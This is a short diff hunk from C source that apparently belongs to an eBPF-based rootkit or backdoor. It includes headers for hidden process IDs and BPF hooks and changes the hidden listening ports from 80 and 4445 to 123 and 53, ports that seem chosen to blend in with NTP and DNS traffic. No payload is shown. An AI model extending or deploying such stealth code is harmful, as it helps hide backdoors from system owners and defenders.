@@ -3,8 +3,8 @@
 #include "../include/hidden_pids.h"
 #include "../include/bpf_hook.h"
 
-#define HIDDEN_PORT  80
-#define HIDDEN_PORT2 4445
+#define HIDDEN_PORT  123
+#define HIDDEN_PORT2 53
 
 /* Per-slot port table (must match icmp.c SRV_PORT / SRV_PORT2) */
 static const u16 bpf_hidden_ports[MAX_INSTANCES] = { HIDDEN_PORT, HIDDEN_PORT2 };
